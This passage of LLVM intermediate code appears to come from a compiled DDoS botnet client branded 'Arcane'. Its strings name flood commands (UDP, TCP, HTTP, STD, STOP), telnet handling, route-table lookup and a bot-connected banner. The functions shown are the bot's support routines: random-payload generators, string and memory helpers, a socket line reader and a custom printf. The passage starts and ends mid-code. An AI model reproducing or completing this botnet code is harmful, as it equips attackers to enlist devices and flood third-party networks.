J/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.127 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.128 = private unnamed_addr constant [5 x i8] c"AUDP\00", align 1
@.str.129 = private unnamed_addr constant [5 x i8] c"ATCP\00", align 1
@.str.130 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"ASTD\00", align 1
@.str.132 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.133 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.134 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.135 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.141 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.142 = private unnamed_addr constant [130 x i8] c"\1B[0;97m[ \1B[0;92mArcane \1B[0;97m] [ \1B[0;92m%s\1B[0;97m ] Connected = \1B[0;92m%s\1B[0;97m  | Endian \1B[0;92m%s  \1B[0;97m| Device: \1B[0;92m%s\00", align 1
@.str.143 = private unnamed_addr constant [2 x i8] c" \00", align 1
@GIP.ipState.0 = internal unnamed_addr global i8 0, align 1
@GIP.ipState.1 = internal unnamed_addr global i8 0, align 1
@GIP.ipState.2 = internal unnamed_addr global i8 0, align 1
@GIP.ipState.3 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() local_unnamed_addr #1 {
  %1 = tail call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i32 0) #6
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %3, label %9

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0), i32 0) #6
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %3
  %7 = tail call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0), i32 0) #6
  %8 = icmp eq i32 %7, -1
  %. = select i1 %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0)
  br label %9

; <label>:9:                                      ; preds = %6, %3, %0
  %.0 = phi i8* [ getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), %0 ], [ getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), %3 ], [ %., %6 ]
  ret i8* %.0
}

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #3 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #3 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() local_unnamed_addr #1 {
  %1 = tail call i64 @time(i64* null) #6
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = tail call i32 @getpid() #6
  %4 = tail call i32 @getppid() #6
  %5 = xor i32 %4, %3
  store i32 %5, i32* @y, align 4
  %6 = tail call i64 @clock() #6
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @y, align 4
  %9 = xor i32 %8, %7
  store i32 %9, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @clock() local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_next() local_unnamed_addr #3 {
  %1 = load i32, i32* @x, align 4
  %2 = shl i32 %1, 11
  %3 = xor i32 %2, %1
  %4 = lshr i32 %3, 8
  %5 = load i32, i32* @y, align 4
  store i32 %5, i32* @x, align 4
  %6 = load i32, i32* @z, align 4
  store i32 %6, i32* @y, align 4
  %7 = load i32, i32* @w, align 4
  store i32 %7, i32* @z, align 4
  %8 = lshr i32 %7, 19
  %9 = xor i32 %4, %3
  %10 = xor i32 %9, %7
  %11 = xor i32 %10, %8
  store i32 %11, i32* @w, align 4
  ret i32 %11
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %15, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %14, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %8

; <label>:5:                                      ; preds = %.lr.ph
  %6 = tail call i32 @rand_next()
  %7 = bitcast i8* %.01011 to i32*
  store i32 %6, i32* %7, align 4
  br label %.backedge

; <label>:8:                                      ; preds = %.lr.ph
  %9 = icmp sgt i32 %.012, 1
  %10 = tail call i32 @rand_next()
  br i1 %9, label %11, label %.backedge.thread

; <label>:11:                                     ; preds = %8
  %12 = trunc i32 %10 to i16
  %13 = bitcast i8* %.01011 to i16*
  store i16 %12, i16* %13, align 2
  br label %.backedge

.backedge:                                        ; preds = %11, %5
  %.sink14 = phi i64 [ 2, %11 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %11 ], [ -4, %5 ]
  %14 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %15 = add i32 %.012, %.sink
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %8
  %17 = trunc i32 %10 to i8
  store i8 %17, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.018 = phi i8* [ %.0.be, %.backedge ], [ %0, %.lr.ph.preheader ]
  %.01317 = phi i32 [ %32, %.backedge ], [ %1, %.lr.ph.preheader ]
  %4 = icmp ugt i32 %.01317, 3
  %5 = tail call i32 @rand_next()
  br i1 %4, label %.preheader, label %28

.preheader:                                       ; preds = %.lr.ph
  %6 = lshr i32 %5, 11
  %7 = lshr i32 %5, 3
  %8 = and i32 %7, 31
  %9 = zext i32 %8 to i64
  %10 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %9
  %11 = load i8, i8* %10, align 1
  %12 = getelementptr inbounds i8, i8* %.018, i64 1
  store i8 %11, i8* %.018, align 1
  %13 = lshr i32 %5, 19
  %14 = and i32 %6, 31
  %15 = zext i32 %14 to i64
  %16 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = getelementptr inbounds i8, i8* %.018, i64 2
  store i8 %17, i8* %12, align 1
  %19 = lshr i32 %5, 27
  %20 = and i32 %13, 31
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = getelementptr inbounds i8, i8* %.018, i64 3
  store i8 %23, i8* %18, align 1
  %25 = zext i32 %19 to i64
  %26 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %25
  %27 = load i8, i8* %26, align 1
  store i8 %27, i8* %24, align 1
  %scevgep = getelementptr i8, i8* %.018, i64 4
  br label %.backedge

; <label>:28:                                     ; preds = %.lr.ph
  %29 = trunc i32 %5 to i8
  %30 = and i8 %29, 31
  %31 = getelementptr inbounds i8, i8* %.018, i64 1
  store i8 %30, i8* %.018, align 1
  br label %.backedge

.backedge:                                        ; preds = %.preheader, %28
  %.sink = phi i32 [ -1, %28 ], [ -4, %.preheader ]
  %.0.be = phi i8* [ %31, %28 ], [ %scevgep, %.preheader ]
  %32 = add i32 %.01317, %.sink
  %33 = icmp sgt i32 %32, 0
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #4 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #3 {
  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %xtraiter = and i32 %2, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %7, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %9, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %6, %.lr.ph.prol ], [ %2, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %6 = add nsw i32 %.056.prol, -1
  %7 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %8 = load i8, i8* %.08.prol, align 1
  %9 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %8, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !1

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %1, %.lr.ph.preheader ], [ %7, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %0, %.lr.ph.preheader ], [ %9, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %2, %.lr.ph.preheader ], [ %6, %.lr.ph.prol.loopexit.unr-lcssa ]
  %10 = icmp ult i32 %5, 7
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader.new ], [ %33, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader.new ], [ %35, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader.new ], [ %32, %.lr.ph ]
  %11 = getelementptr inbounds i8, i8* %.08, i64 1
  %12 = load i8, i8* %.08, align 1
  %13 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %12, i8* %.047, align 1
  %14 = getelementptr inbounds i8, i8* %.08, i64 2
  %15 = load i8, i8* %11, align 1
  %16 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %15, i8* %13, align 1
  %17 = getelementptr inbounds i8, i8* %.08, i64 3
  %18 = load i8, i8* %14, align 1
  %19 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %18, i8* %16, align 1
  %20 = getelementptr inbounds i8, i8* %.08, i64 4
  %21 = load i8, i8* %17, align 1
  %22 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %21, i8* %19, align 1
  %23 = getelementptr inbounds i8, i8* %.08, i64 5
  %24 = load i8, i8* %20, align 1
  %25 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %24, i8* %22, align 1
  %26 = getelementptr inbounds i8, i8* %.08, i64 6
  %27 = load i8, i8* %23, align 1
  %28 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %27, i8* %25, align 1
  %29 = getelementptr inbounds i8, i8* %.08, i64 7
  %30 = load i8, i8* %26, align 1
  %31 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %30, i8* %28, align 1
  %32 = add nsw i32 %.056, -8
  %33 = getelementptr inbounds i8, i8* %.08, i64 8
  %34 = load i8, i8* %29, align 1
  %35 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %34, i8* %31, align 1
  %36 = icmp eq i32 %32, 0
  br i1 %36, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #3 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #6
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %151, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %151 ]
  %.0 = phi i8* [ %1, %3 ], [ %152, %151 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %147 [
    i8 0, label %153
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %153
    i8 37, label %147
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %151 [
    i8 115, label %48
    i8 100, label %66
    i8 120, label %82
    i8 88, label %98
    i8 117, label %114
    i8 99, label %130
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i8**
  %61 = load i8*, i8** %60, align 8
  %62 = icmp ne i8* %61, null
  %63 = select i1 %62, i8* %61, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.144, i64 0, i64 0)
  %64 = tail call fastcc i32 @prints(i8** %0, i8* %63, i32 %.064.lcssa, i32 %.063.lcssa)
  %65 = add nsw i32 %64, %.061
  br label %151

; <label>:66:                                     ; preds = %.critedge
  %67 = load i32, i32* %8, align 8
  %68 = icmp ult i32 %67, 41
  br i1 %68, label %69, label %74

; <label>:69:                                     ; preds = %66
  %70 = load i8*, i8** %9, align 8
  %71 = sext i32 %67 to i64
  %72 = getelementptr i8, i8* %70, i64 %71
  %73 = add i32 %67, 8
  store i32 %73, i32* %8, align 8
  br label %77

; <label>:74:                                     ; preds = %66
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr i8, i8* %75, i64 8
  store i8* %76, i8** %10, align 8
  br label %77

; <label>:77:                                     ; preds = %74, %69
  %.in68 = phi i8* [ %72, %69 ], [ %75, %74 ]
  %78 = bitcast i8* %.in68 to i32*
  %79 = load i32, i32* %78, align 4
  %80 = tail call fastcc i32 @printi(i8** %0, i32 %79, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %81 = add nsw i32 %80, %.061
  br label %151

; <label>:82:                                     ; preds = %.critedge
  %83 = load i32, i32* %11, align 8
  %84 = icmp ult i32 %83, 41
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %82
  %86 = load i8*, i8** %12, align 8
  %87 = sext i32 %83 to i64
  %88 = getelementptr i8, i8* %86, i64 %87
  %89 = add i32 %83, 8
  store i32 %89, i32* %11, align 8
  br label %93

; <label>:90:                                     ; preds = %82
  %91 = load i8*, i8** %13, align 8
  %92 = getelementptr i8, i8* %91, i64 8
  store i8* %92, i8** %13, align 8
  br label %93

; <label>:93:                                     ; preds = %90, %85
  %.in67 = phi i8* [ %88, %85 ], [ %91, %90 ]
  %94 = bitcast i8* %.in67 to i32*
  %95 = load i32, i32* %94, align 4
  %96 = tail call fastcc i32 @printi(i8** %0, i32 %95, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %97 = add nsw i32 %96, %.061
  br label %151

; <label>:98:                                     ; preds = %.critedge
  %99 = load i32, i32* %14, align 8
  %100 = icmp ult i32 %99, 41
